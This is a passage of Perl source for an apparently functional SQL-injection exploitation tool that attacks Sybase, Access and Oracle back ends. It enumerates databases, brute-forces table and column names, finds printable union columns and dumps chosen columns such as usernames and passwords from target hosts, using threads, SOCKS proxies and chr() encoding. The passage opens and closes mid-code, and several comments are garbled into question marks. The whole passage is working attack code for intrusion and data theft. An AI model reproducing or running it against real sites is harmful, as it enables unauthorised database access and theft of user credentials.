print "Proxy - $proxy_message\n";
print "----------------------\n";
$| = 1;
$flag = 0;
$table_name = "";
$ss = 0;
while ($flag == 0) {
$ss++;
if ($s_method == 1) {
if ($ss== 1) {
$current = $s_subquery_url . "convert(" . $s_convert . ",(select" . $s_plus . $s_sql_pref1 . 'max(dbname)' . $s_sql_pref2 . $s_plus . "from" . $s_plus . "master..syslogins))" . $s_filtr;
} else {
$current = $s_subquery_url . "convert(" . $s_convert . ",(select" . $s_plus . $s_sql_pref1 . 'max(dbname)' . $s_sql_pref2 . $s_plus . "from" . $s_plus . "master..syslogins" . $s_plus . "where" . $s_plus . "dbname" . $s_plus . "not" . $s_plus . "in" . $s_plus . "(" . $table_name . ")))" . $s_filtr;
}
}
if ($s_method == 0) {
if ($ss== 1) {
$current = $ss_sql_start . $s_sql_pref1 . 'max(dbname)' . $s_sql_pref2 . $ss_sql_end . $s_plus . "from" . $s_plus . "master..syslogins" . $s_filtr;
} else {
$current = $ss_sql_start . $s_sql_pref1 . 'max(dbname)' . $s_sql_pref2 . $ss_sql_end . $s_plus . "from" . $s_plus . "master..syslogins" . $s_plus . "where" . $s_plus . "dbname" . $s_plus . "not" . $s_plus . "in" . $s_plus . "(" . $table_name . ")" . $s_filtr;
}
}
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/imgs) {
if ($ss == 1) {
$table_name = ascii_to_hex($1);
}
if ($ss > 1) {
$table_name .= "," . ascii_to_hex($1);
}
print FILE $1 . "\n";
print $1 . "\n";
} else {
$flag = 1;
}
print $ss . "\r";
sleep $pause;
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START_sb;
}
if ($choice == 3) {
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------------\n";
print "Enter DB name for get tables name:\n";
print "-----------------------------------------\n";
$choice = <STDIN>;
chomp $choice;
$db_name = $choice;
print "DB name: " . $db_name . "\n";
print FILE "=============================================" . "\n";
print FILE "Tables names from " . $db_name . "\n";
print FILE "=============================================" . "\n";
print "-----------------------------------------\n";
print "Tables names from " . $db_name . "\n";
print "Request method - $method\n";
print "Threads - 1 (Sybase)\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
$| = 1;
$flag = 0;
$table_name = "";
$table_id = "";
$ss = 0;
while ($flag == 0) {
$ss++;
if ($s_method == 1) {
if ($ss== 1) {
$current = $s_subquery_url . "convert(" . $s_convert . ",(select" . $s_plus . $s_sql_pref1 . 'max(name||0x3a||convert(char,id))' . $s_sql_pref2 . $s_plus . "from" . $s_plus . $db_name . "..sysobjects" . $s_plus . "where" . $s_plus . "type=0x55))" . $s_filtr;
} else {
$current = $s_subquery_url . "convert(" . $s_convert . ",(select" . $s_plus . $s_sql_pref1 . 'max(name||0x3a||convert(char,id))' . $s_sql_pref2 . $s_plus . "from" . $s_plus . $db_name . "..sysobjects" . $s_plus . "where" . $s_plus . "type=0x55" . $s_plus . "and" . $s_plus . "id" . $s_plus . "not" . $s_plus . "in" . $s_plus . "(" . $table_id . ")))" . $s_filtr;
}
}
if ($s_method == 0) {
if ($ss== 1) {
$current = $ss_sql_start . $s_sql_pref1 . 'max(name||0x3a||convert(char,id))' . $s_sql_pref2 . $ss_sql_end . $s_plus . "from" . $s_plus . $db_name . "..sysobjects" . $s_plus . "where" . $s_plus . "type=0x55" . $s_filtr;
} else {
$current = $ss_sql_start . $s_sql_pref1 . 'max(name||0x3a||convert(char,id))' . $s_sql_pref2 . $ss_sql_end . $s_plus . "from" . $s_plus . $db_name . "..sysobjects" . $s_plus . "where" . $s_plus . "type=0x55" . $s_plus . "and" . $s_plus . "id" . $s_plus . "not" . $s_plus . "in" . $s_plus . "(" . $table_id . ")" . $s_filtr;
}
}
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/imgs) {
($table_name,$table_id1) = split(/:/,$1);
if ($ss == 1) {
$table_id = $table_id1;
}
if ($ss > 1) {
$table_id .= "," . $table_id1;
}
print FILE "DB [" . $db_name . "], table name [" . $table_name . "], id: --> " . $table_id1 . "\n";
print "DB [" . $db_name . "], table name [" . $table_name . "], id: --> " . $table_id1 . "\n";
} else {
$flag = 1;
}
print $ss . "\r";
sleep $pause;
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START_sb;
}
if ($choice == 4) {
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------------\n";
print "Enter DB name:\n";
print "-----------------------------------------\n";
$choice = <STDIN>;
chomp $choice;
$db_name = $choice;
print "DB name: " . $db_name . "\n";
print "-----------------------------------------\n";
print "Enter table ID for get columns name:\n";
print "-----------------------------------------\n";
$choice = <STDIN>;
chomp $choice;
$table_id = $choice;
print "Table ID: " . $table_id . "\n";
print FILE "=============================================" . "\n";
print FILE "Columns names from DB [" . $db_name . "] and table with ID: " . $table_id . "\n";
print FILE "=============================================" . "\n";
print "-----------------------------------------\n";
print "Columns names from DB [" . $db_name . "] and table with ID: " . $table_id . "\n";
print "Request method - $method\n";
print "Threads - 1 (Sybase)\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
$| = 1;
$flag = 0;
$column_name = "";
$column_id = "";
$ss = 0;
while ($flag == 0) {
$ss++;
if ($s_method == 0) {
if ($ss== 1) {
$current = $ss_sql_start . $s_sql_pref1 . 'max(name||0x3a||convert(char,colid))' . $s_sql_pref2 . $ss_sql_end . $s_plus . "from" . $s_plus . $db_name . "..syscolumns" . $s_plus . "where" . $s_plus . "id=" . $table_id . $s_filtr;
} else {
$current = $ss_sql_start . $s_sql_pref1 . 'max(name||0x3a||convert(char,colid))' . $s_sql_pref2 . $ss_sql_end . $s_plus . "from" . $s_plus . $db_name . "..syscolumns" . $s_plus . "where" . $s_plus . "id=" . $table_id . $s_plus . "and" . $s_plus . "colid" . $s_plus . "not" . $s_plus . "in" . $s_plus . "(" . $column_id . ")" . $s_filtr;
}
}
if ($s_method == 1) {
if ($ss== 1) {
$current = $s_subquery_url . "convert(" . $s_convert . ",(select" . $s_plus . $s_sql_pref1 . 'max(name||0x3a||convert(char,colid))' . $s_sql_pref2 . $s_plus . "from" . $s_plus . $db_name . "..syscolumns" . $s_plus . "where" . $s_plus . "id=" . $table_id . "))" . $s_filtr;
} else {
$current = $s_subquery_url . "convert(" . $s_convert . ",(select" . $s_plus . $s_sql_pref1 . 'max(name||0x3a||convert(char,colid))' . $s_sql_pref2 . $s_plus . "from" . $s_plus . $db_name . "..syscolumns" . $s_plus . "where" . $s_plus . "id=" . $table_id . $s_plus . "and" . $s_plus . "colid" . $s_plus . "not" . $s_plus . "in" . $s_plus . "(" . $column_id . ")))" . $s_filtr;
}
}
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/imgs) {
($column_name,$column_id1) = split(/:/,$1);
if ($ss == 1) {
$column_id = $column_id1;
}
if ($ss > 1) {
$column_id .= "," . $column_id1;
}
print FILE "DB [" . $db_name . "], table ID [" . $table_id . "], column_name: --> " . $column_name . "\n";
print "DB [" . $db_name . "], table ID [" . $table_id . "], column_name: --> " . $column_name . "\n";
} else {
$flag = 1;
}
print $ss . "\r";
sleep $pause;
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START_sb;
}
if ($choice == 5) {
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------------\n";
print "Enter DB name:\n";
print "-----------------------------------------\n";
$choice = <STDIN>;
chomp $choice;
$db_name = $choice;
print "DB name: " . $db_name . "\n";
print "-----------------------------------------\n";
print "Enter Table name:\n";
print "-----------------------------------------\n";
$choice1 = <STDIN>;
chomp $choice1;
$table_name = $choice1;
print "Table name: " . $table_name . "\n";
print "----------------------------------------------------------------------------\n";
print "Enter the column(s) name(s) - for example - id or id,username,user_password:\n";
print "----------------------------------------------------------------------------\n";
$choice2 = <STDIN>;
chomp $choice2;
$column_name1 = $choice2;
$column_name = $choice2;
$f_column = $column_name1;
@column_spis = split(/,/,$column_name);
$size = @column_spis;
if ($size > 1) {
$column_name = "";
$f_column = $column_spis[0];
$a = 0;
while ($a < $size) {
if ($a == ($size-1)) {
$column_name .= "convert(varchar," . $column_spis[$a] . ")";
} else {
$column_name .= "convert(varchar," . $column_spis[$a] . ")||0x3a||";
}
$a++;
}
}
print FILE "-----------------------------------------\n";
print FILE "Dump column(s): [ " . $column_name1 . " ] from [ " . $db_name . ".." . $table_name . " ]\n";
print FILE "-----------------------------------------\n";
print "----------------------------------------------------------------------------\n";
print "Dump column(s): [ " . $column_name1. " ] from [ " . $db_name . ".." . $table_name . " ]\n";
print "Request method - $method\n";
print "Threads - 1 (Sybase)\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
$| = 1;
$current_name = "";
$s = 0;
$flag = 0;
$temp = "";
$temp1 = "";
$temp2 = "";
while ($flag == 0) {
$i = $num;
if ($s_method == 1) {
if ($s == 0) {
$current = $s_subquery_url . "convert(" . $s_convert . ",(select" . $s_plus . $s_sql_pref1 . 'max(' . $column_name . ')' . $s_sql_pref2 . $s_plus . "from" . $s_plus . $db_name . ".." . $table_name . "))" . $s_filtr;
} else {
$current = $s_subquery_url . "convert(" . $s_convert . ",(select" . $s_plus . $s_sql_pref1 . 'max(' . $column_name . ')' . $s_sql_pref2 . $s_plus . "from" . $s_plus . $db_name . ".." . $table_name . $s_plus . "where" . $s_plus . "convert(varchar," . $f_column . ")" . $s_plus . "not" . $s_plus . "in" . $s_plus . "(" . $current_name . ")))" . $s_filtr;
}
}
if ($s_method == 0) {
if ($s == 0) {
$current = $ss_sql_start . $s_sql_pref1 . 'max(' . $column_name . ')' . $s_sql_pref2 . $ss_sql_end . $s_plus . "from" . $s_plus . $db_name . ".." . $table_name . $s_filtr;
} else {
$current = $ss_sql_start . $s_sql_pref1 . 'max(' . $column_name . ')' . $s_sql_pref2 . $ss_sql_end . $s_plus . "from" . $s_plus . $db_name . ".." . $table_name . $s_plus . "where" . $s_plus . "convert(varchar," . $f_column . ")" . $s_plus . "not" . $s_plus . "in" . $s_plus . "(" . $current_name . ")" . $s_filtr;
}
}
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/imgs) {
if ($size == 1) {
if ($s == 0) {
$temp = $1;
$temp1 = int($temp);
if (length($temp) == length($temp1)) {
$current_name = $1;
} else {
$current_name = ascii_to_hex($1);
}
} else {
$temp = $1;
$temp1 = int($temp);
if (length($temp) == length($temp1)) {
$current_name .= "," . $1;
} else {
$current_name .= "," . ascii_to_hex($1);
}
$temp = "";
$temp1 = "";
}
} else {
($temp2) = split(/:/,$1);
if ($s == 0) {
$temp = $temp2;
$temp1 = int($temp);
if (length($temp) == length($temp1)) {
$current_name = $temp2;
} else {
$current_name = ascii_to_hex($temp2);
}
} else {
$temp = $temp2;
$temp1 = int($temp);
if (length($temp) == length($temp1)) {
$current_name .= "," . $temp2;
} else {
$current_name .= "," . ascii_to_hex($temp2);
}
$temp = "";
$temp1 = "";
$temp2 = "";
}
}
print " " . $1 . "\n";
print FILE " " . $1 . "\n";
} else {
$flag = 1;
}
$s++;
print $s . "\r";
sleep $pause;

}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START_sb;
} #end Sybase

if ($choice == 6) {goto START_global}
}
################################################## ################################################## #############
## Access ##
if ($choice == 5) {
START_a:
if ($a_source_sql =~ m/^https:\/\/?([^\/]+)/i) {
$host10 = $1;
$https_flag = 1;
print "----------------------\n";
print "HTTPS mode enabled\n";
print "----------------------\n";
}
$host = $host10;
if ($https_mode_auth == 1 && $https_auth_check == 0 && $https_flag == 1) {
print "-----------------------------------------\n";
print "Authorization required, wait please....";
my $answ1 = req($host, $https_auth_script_path, 'POST', $https_auth_post_data, 0);
$ck1 = collect($answ1);
$https_auth_check = 1;
print " DONE\n";
print "-----------------------------------------\n";
}
if ($use_socks == 1 && $socks_check == 0) {
$check_url = $host;
our $query = "GET / HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Referer: http://" . $check_url . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090716 Ubuntu/9.04 (jaunty) Shiretoko/3.5.1\r\n"
. "Connection: close\r\n\r\n";
print "----------------------------------------\n";
print "You choose mode with SOCKS, try to find good in $socks_file ...\n";
print "Timeout = 5 sec:\n";
print "----------------------------------------\n";
$socks_check = 0;
$check_socks = socks_check();
($current_proxy_host,$current_proxy_port,$socks_ty pe) = split(/:/,$check_socks);
$proxy_message = "$current_proxy_host:$current_proxy_port, SOCKS" . $socks_type;
if ($current_proxy_host) {
$socks_check = 1;
print "Will use --> $proxy_message\n";
} else {
$socks_check = 0;
$proxy_message = "No";
print "No good SOCKS in " . $socks_file . ", change mode. Exit...\n";
}
}
print "----------------------------------------------------------\n";
print " Choose mode:\n";
print "----------------------------------------------------------\n";
print " [1] Access Sql inj brute column number\n";
print " [2] Access Sql inj brute tables\n";
print " [3] Access Sql inj brute columns\n";
print " [4] Access Sql inj get data from columns\n";
print "----------------------------------------------------------\n";
print " [5] Main menu\n";
print "----------------------------------------------------------\n";
$choice = <STDIN>;
chomp $choice;
print "Your choice - $choice\n";
if ($choice == 1) {
open( FILE1, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print FILE1 " Number of columns:\n";
print FILE1 " -------------\n";
print "-----------------------------------------\n";
print "Access brute column number\n";
print "URL - " . $a_source_sql . $a_plus . "order" . $a_plus . "by" . "..." . $a_filtr . "\n";
print "Error message = [" .$a_error_code_column_more."]\n";
print "Max columns = [" .$a_max_column_number."]\n";
print "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - 10\n";
print "Proxy - $proxy_message\n";
print "-----------------------------------------\n";
%aa = ();
$aa = a_column_number();
$data1 = "";
$data1 = $aa->{$_},for sort {$a <=> $b} keys %$aa;
while ( my ($key, $value) = each(%$aa) ) {
if ($data1 > $value) {$data1 = $value}
}
$column_num = $data1 - 1;
sub a_column_number {
$i = 1;
while($i <= $a_max_column_number) {
$url = $a_source_sql . $a_plus . "order" . $a_plus . "by" . $a_plus . $i . $a_filtr;
push(@columns_brute_url, $url);
push(@columns_brute_n, $i);
$i++;
}
$size = @columns_brute_n;
$thr = 10;
$num = -1;
%res5 = ();
$i = 0;
for(0..$thr) {
$trl[$_] = threads->create(\&gets1010);
}
for(0..$thr) {
%res5 = (%res5, %{$trl[$_]->join});
}
sub gets1010 {
$| = 1;
$data5 = 0;
$ii = 0;
while ($num < $size) {
{ lock($num);
$num++; }
$ii = $num;
if ($ii < $size) {
$a_current = $columns_brute_url[$num];
$nom = $columns_brute_n[$num];
$current_error = $a_error_code_column_more;
$data5 = a_column_check();
if ($data5 == 1) {
$hash5{$ii} = $nom;
return \%hash5;
}
}
print $num . "\r";
sleep $pause;
}
}
return \%res5;
}
if ($column_num == -1) {
print "Can't find number of columns\n";
} else {
print "Find column number - $column_num\n";
$union = $a_source_sql . $a_plus . "union" . $a_plus . "select" . $a_plus;
$i = 1;
while ($i <= $column_num) {
if ($i == 1) {
$union .= 1;
} else {
$union .= "," . $i;
}
$i++;
}
$a_current_url = $union . $a_plus . "from" . $a_plus;
print $union . $a_plus . "from" . $a_plus . "[table]" . $a_filtr ."\n";
print FILE1 $union . $a_plus . "from" . $a_plus . "[table]" . $a_filtr ."\n";
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE1);
goto START_a;
}
if ($choice == 2) {
open( FILE1, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print " Brute tables\n";
print " -------------\n";
print FILE1 " Brute tables\n";
print FILE1 " -------------\n";
print " Enter number of columns:\n";
$choice1 = <STDIN>;
chomp $choice1;
$union = $a_source_sql . $a_plus . "union" . $a_plus . "select" . $a_plus;
$i = 1;
while ($i <= $choice1) {
if ($i == 1) {
$union .= 1;
} else {
$union .= "," . $i;
}
$i++;
}
$a_current_url = $union . $a_plus . "from" . $a_plus;
print $a_current_url . "[brute table]" . $a_filtr . "\n";
print " --------------------------------------------------------------------------\n";
open(FILE, "<", $source_table_list);
$c = " ";
while(<FILE>) {
chomp;
($a,$b)= split(/$c/,$_);
if (!$b) {push(@tables4, $_)}
}
close(FILE);
print "Add prefix for brute tables ? ( for example - tbl_ ) (1/0): ";
$choice = <STDIN>;
chomp $choice;
if ($choice == 1) {
print "Enter your prefix for brute tables: ";
$choice = <STDIN>;
chomp $choice;
$pref_brute = $choice;
} else {
$pref_brute = "";
}
$size = @tables4;
print "File: $source_table_list\n";
print "Tables: $size\n";
print "-------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
for(0..$thr) {
$trl[$_] = threads->create(\&gets731);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets731 {
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
$current1 = $pref_brute . $tables4[$num];
$a_current = $a_current_url . $current1 . $a_filtr;
$current_error = $a_error_code_table;
$content = a_table_check();
if ($content == 1) {
print " ---> " . $current1 . "\n";
print FILE1 " " . $current1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE1);
goto START_a;

}
if ($choice == 3) {
open( FILE1, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print " Brute columns\n";
print " -------------\n";
print " Enter number of columns:\n";
$choice1 = <STDIN>;
chomp $choice1;
print FILE1 " -------------\n";
print " Enter table_name:\n";
$choice2 = <STDIN>;
chomp $choice2;
$table_name = $choice2;
$union = $a_source_sql . $a_plus . "union" . $a_plus . "select" . $a_plus;
$i = 1;
while ($i <= $choice1) {
if ($i == 1) {
$union .= $a_sql_pref1 . "StrConv(" . $i . ",1)" . $a_sql_pref2;
} else {
$union .= "," . $a_sql_pref1 . "StrConv(" . $i . ",1)" . $a_sql_pref2;
}
$i++;
}

$a_current_url = $union . $a_plus . "from" . $a_plus;
$current = $a_current_url . $table_name . $a_filtr;
print "Find out printable column, wait please...\n";
print "------------------------------------------\n";
$content = scan_url();
$print_column = 0;
for ($i = 1; $i <= $choice1; $i++) {
if ($content =~ m/\^$i\^/img) {
$print_column = $i;
print "Printable column - " . $i . "\n";
print FILE1 "Printable column - " . $i . "\n";
$i = $choice1;
}
}
if ($print_column == 0) {
print "Can't find printable column...";
goto START_a;
}
$union = $a_source_sql . $a_plus . "union" . $a_plus . "select" . $a_plus;
$i = 1;
$flag = 0;
while ($i <= $choice1) {
if ($i == 1) {
$union .= 1;
} else {
if ($i == $print_column) {
if ($i == 1) {
$union .= "^";
} else {
$union .= ",^";
}
} else {
$union .= "," . $i;
}
}
$i++;
}
($union_left,$union_right) = split(/\^/,$union);
print $union_left . "[brute column]" . $union_right . $a_plus . "from" . $a_plus . $table_name . $a_filtr . "\n";
print " --------------------------------------------------------------------------\n";
print FILE1 " Brute columns from $table_name\n";
print FILE1 $union_left . "[brute column]" . $union_right . $a_plus . "from" . $a_plus . $table_name . $a_filtr . "\n";
print FILE1 " -------------\n";
open(FILE, "<", $source_column_list);
$c = " ";
while(<FILE>) {
chomp;
($a,$b)= split(/$c/,$_);
if (!$b) {push(@columns4, $_)}
}
close(FILE);
print "Add prefix for brute columns ? ( for example - tbl_ ) (1/0): ";
$choice = <STDIN>;
chomp $choice;
if ($choice == 1) {
print "Enter your prefix for brute columns: ";
$choice = <STDIN>;
chomp $choice;
$pref_brute = $choice;
} else {
$pref_brute = "";
}
$size = @columns4;
print "File: $source_column_list\n";
print "Columns: $size\n";
print "-------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
for(0..$thr) {
$trl[$_] = threads->create(\&gets732);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets732 {
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
$current1 = $pref_brute . $columns4[$num];
$a_current = $union_left . $current1 . $union_right . $a_plus . "from" . $a_plus . $table_name . $a_filtr;
$current_error = $a_error_code_column;
$content = a_table_check();
if ($content == 1) {
print " ---> " . $current1 . "\n";
print FILE1 " " . $current1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE1);
goto START_a;

}
if ($choice == 4) {
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
sub achar($) {
$str1=$_[0];
$aa="";$bb="";
for ($i = 0; $i<length($str1); $i++ ) {
$aa = ord(substr($str1,$i,1));
if ( $i == 0 ) {$bb= "chr(" . $aa . ")";} else { $bb= $bb. "%2bchr(" . $aa . ")" ;}
}
return "$bb";
}
print " Enter number of columns:\n";
$choice1 = <STDIN>;
chomp $choice1;
print FILE1 " -------------\n";
print " Enter table_name:\n";
$choice2 = <STDIN>;
chomp $choice2;
$table_name = $choice2;
$union = $a_source_sql . $a_plus . "union" . $a_plus . "select" . $a_plus;
$i = 1;
while ($i <= $choice1) {
if ($i == 1) {
$union .= $a_sql_pref1 . "StrConv(" . $i . ",1)" . $a_sql_pref2;
} else {
$union .= "," . $a_sql_pref1 . "StrConv(" . $i . ",1)" . $a_sql_pref2;
}
$i++;
}

$a_current_url = $union . $a_plus . "from" . $a_plus;
$current = $a_current_url . $table_name . $a_filtr;
print "Find out printable column, wait please...\n";
print "------------------------------------------\n";
$content = scan_url();
$print_column = 0;
for ($i = 1; $i <= $choice1; $i++) {
if ($content =~ m/\^$i\^/img) {
$print_column = $i;
print "Printable column - " . $i . "\n";
print FILE1 "Printable column - " . $i . "\n";
$i = $choice1;
}
}
if ($print_column == 0) {
print "Can't find printable column...";
close(FILE);
goto START_a;
}
$union = $a_source_sql . $a_plus . "union" . $a_plus . "select" . $a_plus . "top" . $a_plus . "1" . $a_plus;
$i = 1;
$flag = 0;
while ($i <= $choice1) {
if ($i == 1) {
$union .= 1;
} else {
if ($i == $print_column) {
if ($i == 1) {
$union .= "^";
} else {
$union .= ",^";
}
} else {
$union .= "," . $i;
}
}
$i++;
}
($union_left,$union_right) = split(/\^/,$union);
print $union_left . "[data]" . $union_right . $a_plus . "from" . $a_plus . $table_name . $a_filtr . "\n";
print " --------------------------------------------------------------------------\n";
print "Enter the column(s) name(s) - for example - id or id,username,user_password:\n";
$choice = <STDIN>;
print "Detect column(s) type, wait please....";
chomp $choice;
$column_name1 = $choice;
@column_spis = split(/,/,$column_name1);
$size = @column_spis;
if ($size == 1) {
$f_column = $column_name1;
$current = $union_left . $a_sql_pref1 . $column_name1 . $a_sql_pref2 . $union_right . $a_plus . "from" . $a_plus . $table_name . $a_filtr;
$content = scan_url();
if ($content =~ m/Data type mismatch/imgs) {
$column_name = "StrConv(" . $column_name1 . ",1)";
} else {
$column_name = $column_name1;
}
}
if ($size > 1) {
$column_name = "";
$f_column = $column_spis[0];
$a = 0;
while ($a < $size) {
if ($a == ($size-1)) {
$current = $union_left . $a_sql_pref1 . $column_spis[$a] . $a_sql_pref2 . $union_right . $a_plus . "from" . $a_plus . $table_name . $a_filtr;
$content = scan_url();
if ($content =~ m/Data type mismatch/imgs) {
$column_name .= "StrConv(" . $column_spis[$a] . ",1)";
} else {
$column_name .= $column_spis[$a];
}
} else {
$current = $union_left . $a_sql_pref1 . $column_spis[$a] . $a_sql_pref2 . $union_right . $a_plus . "from" . $a_plus . $table_name . $a_filtr;
$content = scan_url();
if ($content =~ m/Data type mismatch/imgs) {
$column_name .= "StrConv(" . $column_spis[$a] . ",1)%2Bchr(58)%2B";;
} else {
$column_name .= $column_spis[$a] . "%2Bchr(58)%2B";
}
}
$a++;
}
}
print "DONE\n";
print FILE "-----------------------------------------\n";
print FILE "Dump column(s): [ " . $column_name1 . " ] from [ " . $table_name . " ]\n";
print FILE "-----------------------------------------\n";
print "Dump column(s): [ " . $column_name1 . " ] from [ " .$table_name . " ]\n";
print "-----------------------------------------\n";
## ?????? ???-?? ???????? ?? ??????? #
print "Count data from [ $table_name ]\n";
$current = $union_left . "chr(94)%2bStrConv(count(*),1)%2bchr(94)" . $union_right . $a_plus . "from" . $a_plus . $table_name . $a_filtr;
$content = scan_url();
$column_name_p1 = $content;
$column_name_p1 =~ m/\^(.*)\^/imgs;
$column_name_p = $1;
print "$column_name_p\n";
print "----------\n";
print "Get ALL data from " . $table_name . " (" . $column_name_p . ") ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
$thr = $kol_threads; # ???-?? ???????
if ($choice == 1) {
$num = 0; # ?? ????????
} else {
print "Enter START_position: ";
$choice1 = <STDIN>;
chomp $choice1;
$num = $choice1-1;
print "Enter END_position: ";
$choice2 = <STDIN>;
chomp $choice2;
$column_name_p = $choice2-1;
print "Dump records from [" . ($num+1) . "] to [" . ($column_name_p+1) . "]\n";
}
print "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
## ?????? ?????? ?? ??????? ##
$| = 1;
$current_name = "";
$s = 0;
$flag = 0;
$temp = "";
$temp1 = "";
$temp2 = "";
while ($flag == 0) {
$i = $num;
if ($s == 0) {
$current = $union_left . $a_sql_pref1 . $column_name . $a_sql_pref2 . $union_right . $a_plus . "from" . $a_plus . $table_name . $a_filtr;
} else {
$current = $union_left . $a_sql_pref1 . $column_name . $a_sql_pref2 . $union_right . $a_plus . "from" . $a_plus . $table_name . $a_plus . "where" . $a_plus . $f_column . $a_plus . "not" . $a_plus . "in" . $a_plus . "(" . $current_name . ")" . $a_filtr;
}
$content = scan_url();
if ($content =~ m/\^(.*)\^/imgs) {
if ($size == 1) {
if ($s == 0) {
$temp = $1;
$temp1 = int($temp);
if (length($temp) == length($temp1)) {
$current_name = $1;
} else {
$current_name = achar($1);
}
} else {
$temp = $1;
$temp1 = int($temp);
if (length($temp) == length($temp1)) {
$current_name .= "," . $1;
} else {
$current_name .= "," . achar($1);
}
$temp = "";
$temp1 = "";
}
} else {
($temp2) = split(/:/,$1);
if ($s == 0) {
$temp = $temp2;
$temp1 = int($temp);
if (length($temp) == length($temp1)) {
$current_name = $temp2;
} else {
$current_name = achar($temp2);
}
} else {
$temp = $temp2;
$temp1 = int($temp);
if (length($temp) == length($temp1)) {
$current_name .= "," . $temp2;
} else {
$current_name .= "," . achar($temp2);
}
$temp = "";
$temp1 = "";
$temp2 = "";
}
}
print " " . $1 . "\n";
print FILE " " . $1 . "\n";
} else {
$flag = 1;
}
$s++;
print $s . "\r";
sleep $pause;

}
#}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto goto START_a;

}
if ($choice == 5) {goto START_global}
}
################################################## ################################################## ################
## Oracle sql inj ##
if ($choice == 6) {
START_o:
if ($o_source_sql =~ m/^https:\/\/?([^\/]+)/i) {
$host11 = $1;
$https_flag = 1;
print "----------------------\n";
print "HTTPS mode enabled\n";
print "----------------------\n";
}
$host = $host11;
if ($https_mode_auth == 1 && $https_auth_check == 0 && $https_flag == 1) {
print "-----------------------------------------\n";
print "Authorization required, wait please....";
my $answ1 = req($host, $https_auth_script_path, 'POST', $https_auth_post_data, 0);
$ck1 = collect($answ1);
$https_auth_check = 1;
print " DONE\n";
print "-----------------------------------------\n";
}
if ($use_socks == 1 && $socks_check == 0) {
$check_url = $host;
our $query = "GET / HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Referer: http://" . $check_url . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090716 Ubuntu/9.04 (jaunty) Shiretoko/3.5.1\r\n"
. "Connection: close\r\n\r\n";
print "----------------------------------------\n";
print "You choose mode with SOCKS, try to find good in $socks_file ...\n";
print "Timeout = 5 sec:\n";
print "----------------------------------------\n";
$socks_check = 0;
$check_socks = socks_check();
($current_proxy_host,$current_proxy_port,$socks_ty pe) = split(/:/,$check_socks);
$proxy_message = "$current_proxy_host:$current_proxy_port, SOCKS" . $socks_type;
if ($current_proxy_host) {
$socks_check = 1;
print "Will use --> $proxy_message\n";
} else {
$socks_check = 0;
$proxy_message = "No";
print "No good SOCKS in " . $socks_file . ", change mode. Exit...\n";
}
}
sub char_p($) {
$str1=$_[0];
$aa="";$bb="";
for ($i = 0; $i<length($str1); $i++ ) {
$aa = ord(substr($str1,$i,1));
if ( $i == 0 ) {$bb= "chr(" . $aa . ")";} else { $bb= $bb. "||chr(" . $aa . ")" ;}
}
return "$bb";
}
print "----------------------------------------------------------\n";
print " Choose mode:\n";
print "----------------------------------------------------------\n";
print " [1] Oracle SQL inj system information\n";
print " [2] Oracle SQL inj get tables from sys.user_tables\n";
print " [3] Oracle SQL inj get column_name from table\n";
print " [4] Oracle SQL inj get data from columns\n";
print " ================================================== =====\n";
print " [5] Main menu\n";
print "----------------------------------------------------------\n";
$choice = <STDIN>;
chomp $choice;
print "Your choice: $choice\n";
if ($choice == 1) {
open( FILE, ">>" . "z_" . $host . ".txt" ); # ???? ??? ?????? ???????????
$url1 = $o_sql_start . $o_sql_pref1 . "to_" . $o_convert . "(BANNER)" .$o_sql_pref2 . $o_sql_end . $o_plus . "FROM" . $o_plus . 'V$VERSION' . $o_filtr;
$url2 = $o_sql_start . $o_sql_pref1 . "to_" . $o_convert . "(USER)" .$o_sql_pref2 . $o_sql_end . $o_plus . "FROM" . $o_plus . 'sys.dual' . $o_filtr;
@array = ($url1,$url2);
$size = @array; #???????? ?????? ???????
